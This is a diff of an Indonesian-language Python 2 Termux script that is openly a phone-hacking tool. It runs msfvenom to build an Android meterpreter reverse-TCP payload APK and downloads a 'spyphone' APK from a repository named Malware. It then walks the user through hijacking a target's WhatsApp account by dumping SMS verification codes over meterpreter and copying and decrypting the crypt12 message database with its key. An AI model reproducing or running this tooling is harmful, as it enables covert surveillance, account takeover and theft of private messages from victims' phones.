@@ -1,9 +1,7 @@
 # -*- coding: utf-8 -*-
 
-import requests
-import os
+import os, sys
 import time
-import sys
 import random
 from termcolor import colored
 
@@ -22,19 +20,24 @@ def flush(s):
     for c in s + '\n':
         sys.stdout.write(c)
         sys.stdout.flush()
-        time.sleep(random.random() * 0.1)
+        time.sleep(random.random() * 0.01)
 
 def out():
 	exit()
 	
 def back():
-	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+	print putih+'---------------------------------------------------'
+	raw_input('\n\x1b[1;91m					[ \x1b[1;97mBack \x1b[1;91m]')
 	home()
+	
+def nxt():
+	print putih+'---------------------------------------------------'
+	raw_input('\n\x1b[1;91m					[ \x1b[1;97mNext \x1b[1;91m]')
 
 os.system("clear")
-confirm =raw_input(putih+'Sudah mempunyai akun Portmap.io? y/n : ')
+confirm =raw_input(putih+'SUDAH PUNYA AKUN PORTMAP.IO ? y/n : ')
 if confirm== 'y':
-  os.system('clear')  
+  os.system('clear')
 else :
   if confirm== 'n':
     print '' 
@@ -49,7 +52,7 @@ else :
     else :
       os.system('python2 msfgaf.py')
       
-confirm=raw_input('sudah Aktifkan OpenVPN?  y/n : ')
+confirm=raw_input('SUDAH AKTIFKAN OPENVPN ?  y/n : ')
 if confirm== '' :
 	os.system('python2 msfgaf.py')
 else :
@@ -95,9 +98,9 @@ def payload():
 		print 'Harus Diisi'
 	else :
 		print ' '
-	print hijau+'PLEASE WAIT 5 - 20 Minutes...' 
+	print hijau+'PLEASE WAIT 5 - 20 Minutes...'
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
-
+	
 def spyphone_V14():
 	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
@@ -130,41 +133,59 @@ def extract_wa():
 	os.system('clear')
 	logo()
 	time.sleep(1)
-	print ' '
-	print hijau+'------------------------------------'
-	flush('Ambil alih akunya ')
-	flush('dump_sms')
-	print '-------------------------------------'
-	flush('saya akan berikan yang kamu inginkan')
-	print '-------------------------------------'
-	print ' '
-	time.sleep(1)
-	zedd=raw_input('Siap menyelam Kesystem? y/n : ')
-	if zedd == 'y':
-		remote()
-	else :
-		if zedd == 'n':
-			home()
+	flush('Buka Aplikasi GBWhatsApp') 
+	flush('kemudian Login dengan nomor Target')
+	nxt()
+	print hijau
+	flush(merah+'[!]'+hijau+' Anda akan memasuki mode meterpreter')
+	flush(merah+'[!]'+hijau+' pastikan Backdoor') 
+	flush('    dan OpenVPN telah aktif')
+	flush(merah+'[!]'+hijau+' Ambil Kode Verifikasi Target')
+	flush('    Dan database target')
+	flush(merah+'[!]'+hijau+' Gunakan Command')
+	print cyan
+	flush('    dump_sms	')
+	flush('    download {database}')
+	nxt()
+	flush(hijau+'Membuka Msfconsole ... ')
+	remote()
+	flush(putih+'Buka link Verifikasi yang paling Atas')
+	flush('Untuk Meretas akun Target')
+	print putih+'---------------------------------------------------'
+	print cyan
 	os.system('chmod +x link.txt')
 	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
 	f= open("link.txt")
 	if f.mode == "r":
-		link = f.read()
-		os.system('termux-open '+f.read())
+		T= f.read()
+		print T
 	else:
 		print merah+'[!] tidak bisa membaca kode'
 		home()
-	os.system('git clone https://github.com/PyRAT-svg/decryptor12 &&mv -f decryptor12 d')
-	os.system('cp msgstore.db.crypt12 d/msgstore.db.crypt12 ')
-	os.system('cp key d/key')
-	os.system('cd d && php decrypt.php msgstore.db.crypt12 key') 
-	os.system('cd d/src &&mv msgstore.db /storage/emulated/0/BackupTextForWhatsApp/msgstore.db && cp msgstore.db msgstore.enc')
-	os.system('cd d &&mkdir /storage/emulated/0/msfgaf && mv -f key /storage/emulated/0/key')
+	nxt()
+	print putih
+	flush('Setelah berhasil meretas akun target')
+	flush('lakukan backup GbWhatsApp')
+	flush('untuk mendapatkan key')
+	nxt()
+	dstb = '/storage/emulated/0/WhatsApp/Databases/'
+	dstd = '/storage/emulated/0/BackupTextForWhatsApp/' 
+	flush('Sedang melakukan Backup')
+	time.sleep(1)
+	os.system('cp '+dstb+'*crypt12 '+dstd) 
+	flush('Database lama telah tersimpan')
+	os.system('cp link.txt '+dstd)
+	time.sleep(1)
+	flush('extract database....')
+	time.sleep(1)
+	os.system('mv -f msgstore.db.crypt12 '+dstb+'&&mv -f key '+dstd)
+	time.sleep(1)
 	flush('key tool saved in storage')
-	time.sleep(2)
+	time.sleep(1)
 	flush('cleaning..')
-	os.system('rm -rf d')
-	os.system('am start --user 0 -n com.smeiti.wstotexu/com.smeiti.wstotexu.WStoTextActivity')
+	time.sleep(1)
+	os.system('rm -rf *txt')
+	os.system('am start --user 0 -n com.smeiti.wstotext/com.smeiti.wstotext.WStoTextActivity')
 	back()
 
 def awal():
@@ -209,7 +230,7 @@ def malware():
 
 
 def logo():      
-	f = open('asci.txt')
+	f = open('Baner/asci')
 	print colored(f.read(),'yellow')
 	f.close
 	print '---------------------------------------------------'
@@ -225,9 +246,13 @@ def remote():
     logo()
     print (''+putih)
     os.system('ifconfig | grep -o [0-9][0-9][.][0-9][.][0-9][0-9][.][0-9][0-9][0-9] > ip.txt')
-    print ('')
+    f = open('ip.txt')
+    g = f.read()
+    if g == '':
+    	print (merah+'[!]'+putih+' IP tidak terdeteksi Aktifkan OpenVPN')
+    	out()
+	f.close
     print (merah+'___________________«»')
-    
     print putih+"IP Local Mu"
     print "\x1b[1;91m----------------------------------------------"
     print " pastekan IP Tun0 inet disini"
